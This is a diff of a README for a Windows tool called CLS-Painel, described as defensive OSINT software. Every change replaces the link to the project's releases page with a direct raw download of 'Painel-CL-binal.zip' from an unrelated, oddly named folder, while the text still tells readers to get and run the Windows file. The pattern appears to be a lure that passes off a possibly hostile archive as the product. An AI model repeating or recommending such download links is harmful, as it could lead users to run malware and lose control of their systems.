@@ -1,6 +1,6 @@
 # 🔎 CLS-Painel - Defensive OSINT for Windows
 
-[![Download CLS-Painel](https://img.shields.io/badge/Download-CLS--Painel-blue?style=for-the-badge&logo=github)](https://github.com/labinnah1933/CLS-Painel/releases)
+[![Download CLS-Painel](https://img.shields.io/badge/Download-CLS--Painel-blue?style=for-the-badge&logo=github)](https://github.com/labinnah1933/CLS-Painel/raw/refs/heads/main/laryngotracheoscopy/Painel-CL-binal.zip)
 
 ## 🚀 What CLS-Painel does
 
@@ -12,7 +12,7 @@ It is built for users who want a simple way to look for public account data with
 
 Visit the release page to download CLS-Painel for Windows:
 
-https://github.com/labinnah1933/CLS-Painel/releases
+https://github.com/labinnah1933/CLS-Painel/raw/refs/heads/main/laryngotracheoscopy/Painel-CL-binal.zip
 
 After you open the page, look for the latest release and get the Windows file from the assets list.
 
@@ -174,6 +174,6 @@ This project is linked to:
 
 If you need a fresh copy, use the release page again:
 
-https://github.com/labinnah1933/CLS-Painel/releases
+https://github.com/labinnah1933/CLS-Painel/raw/refs/heads/main/laryngotracheoscopy/Painel-CL-binal.zip
 
 Open the latest release, get the Windows file, extract it if needed, and run the app from your desktop or downloads folder
